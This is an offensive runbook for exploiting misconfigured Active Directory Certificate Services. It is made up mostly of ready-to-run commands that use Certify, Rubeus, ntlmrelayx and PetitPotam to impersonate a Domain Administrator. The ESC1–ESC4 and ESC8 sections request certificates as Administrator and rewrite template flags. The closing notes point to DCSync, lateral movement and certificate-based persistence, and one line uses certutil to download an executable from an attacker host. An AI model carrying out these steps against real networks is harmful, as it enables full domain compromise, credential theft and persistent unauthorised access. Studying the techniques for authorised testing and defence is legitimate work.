# ADCS Attack Runbook

> Active Directory Certificate Services — if misconfigured, instant DA.

---

## ESC1: SAN + Client Auth (Most Common)

**Condition:** Template allows client authentication AND requestor can supply Subject Alternative Name (SAN).

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable
# Look for: msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT
# AND: Extended Key Usage includes Client Authentication

# Request cert as Domain Admin
.\Certify.exe request /ca:<CA_HOST\CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator

# You'll get a .pem file — convert to .pfx on Kali
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Transfer cert.pfx to Windows target
# Get TGT as Administrator
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<EXPORT_PASS> /ptt

# Verify
klist
dir \\dc01\c$    # test DA access
```

---

## ESC2: Any Purpose Template + SAN

**Condition:** Template with "Any Purpose" EKU and enrollee supplies subject.

```powershell
# Same as ESC1 but the template EKU is "Any Purpose" or empty
.\Certify.exe request /ca:<CA\NAME> /template:<ESC2_TEMPLATE> /altname:Administrator
```

---

## ESC3: Enrollment Agent Certificate

**Condition:** Can enroll for enrollment agent cert, then use it to request certs on behalf of anyone.

```powershell
# Step 1: Get enrollment agent cert
.\Certify.exe request /ca:<CA\NAME> /template:EnrollmentAgent

# Step 2: Use agent cert to request cert as DA
.\Certify.exe request /ca:<CA\NAME> /template:<CLIENT_AUTH_TEMPLATE> /onbehalfof:CORP\Administrator /enrollcert:agent.pfx /enrollcertpw:<PW>
```

---

## ESC4: Misconfigured Template ACL

**Condition:** You have WriteDACL/GenericAll on a certificate template.

```powershell
# Modify template to allow SAN supply
# Then exploit as ESC1

# Via PowerShell
$Template = [ADSI]"LDAP://CN=<TEMPLATE>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com"
$Template.Put("msPKI-Certificate-Name-Flag", 1)
$Template.SetInfo()
```

---

## ESC8: NTLM Relay to ADCS Web Enrollment

**Condition:** ADCS web enrollment enabled (common), SMB signing disabled somewhere.

```bash
# Relay NTLM auth to ADCS web enrollment endpoint
python3 ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Force DC to authenticate (Petitpotam)
python3 PetitPotam.py <KALI_IP> <DC_IP>

# Get cert, convert to TGT
```

---

## Find ADCS Manually

```powershell
# Find CA servers
certutil -config - -ping 2>&1 | findstr "ACTIVE"
Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -SearchBase "CN=Configuration,DC=corp,DC=com"

# Certify quick scan
.\Certify.exe cas
.\Certify.exe find
.\Certify.exe find /vulnerable   # most important
```

---

## Notes
- ESC1 is the most common and easiest to exploit
- After getting a cert-based TGT, use it like any other TGT (lateral movement, DCSync)
- Certs survive password changes — use for persistence
- `certutil` is a LOLBin — can download files: `certutil -urlcache -split -f http://<KALI>/file.exe file.exe`
